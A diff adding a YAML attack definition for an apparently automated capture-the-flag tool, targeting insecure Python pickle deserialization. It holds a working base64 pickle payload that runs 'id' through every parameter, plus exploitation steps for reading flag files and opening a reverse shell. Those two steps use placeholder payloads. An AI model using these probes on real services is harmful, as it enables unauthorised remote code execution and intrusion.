@@ -1,0 +1,114 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_pickle_deser
+name: Python Pickle Deserialization
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits insecure Python pickle deserialization via __reduce__
+  gadgets to achieve remote code execution. Targets Flask sessions, data APIs,
+  and any endpoint accepting serialized Python objects.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "'python' in context.tech_stack or 'flask' in context.tech_stack or 'django' in context.tech_stack"
+    boost: 0.35
+    label: "Python framework detected"
+  - if: "any(p in context.params for p in ['session','data','pickle','object','serialized'])"
+    boost: 0.25
+    label: "Serialization parameter found"
+  - if: "any(p in context.found_paths for p in ['/api', '/upload', '/import', '/data'])"
+    boost: 0.15
+    label: "Data processing endpoint found"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: pickle_magic_bytes
+    name: Pickle format detection
+    description: >
+      Detect pickle format by magic bytes or base64 patterns.
+    min_confidence: 0.10
+    steps:
+      - id: pickle_pattern_match
+        action: http_probe
+        params:
+          inject_into: none
+          payloads: []
+        signals:
+          - match: '\\x80\\x03|\\x80\\x04|gASV'
+            on_match:
+              confidence_boost: 0.40
+              emit: pickle_format_detected
+
+  - id: pickle_rce_probe
+    name: Pickle RCE detection
+    description: >
+      Test pickle deserialization with harmless command execution.
+    min_confidence: 0.25
+    steps:
+      - id: safe_rce_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - 'gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIwCaWSUhZRSlC4='
+        signals:
+          - match: 'uid='
+            on_match:
+              confidence_boost: 0.50
+              emit: pickle_rce_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: pickle_flag_read
+    name: Pickle RCE flag extraction
+    requires_signal: pickle_rce_confirmed
+    technique: pickle_reduce_rce
+    steps:
+      - id: execute_flag_read
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'PICKLE_PAYLOAD_cat_flag_txt'
+            - 'PICKLE_PAYLOAD_cat_slash_flag_txt'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: pickle_reverse_shell
+    name: Pickle reverse shell
+    requires_signal: pickle_rce_confirmed
+    technique: pickle_reverse_connection
+    steps:
+      - id: rev_shell_payload
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'PICKLE_REVERSE_SHELL_PAYLOAD'
+        capture:
+          - pattern: 'connection|shell'
+            as: shell_established
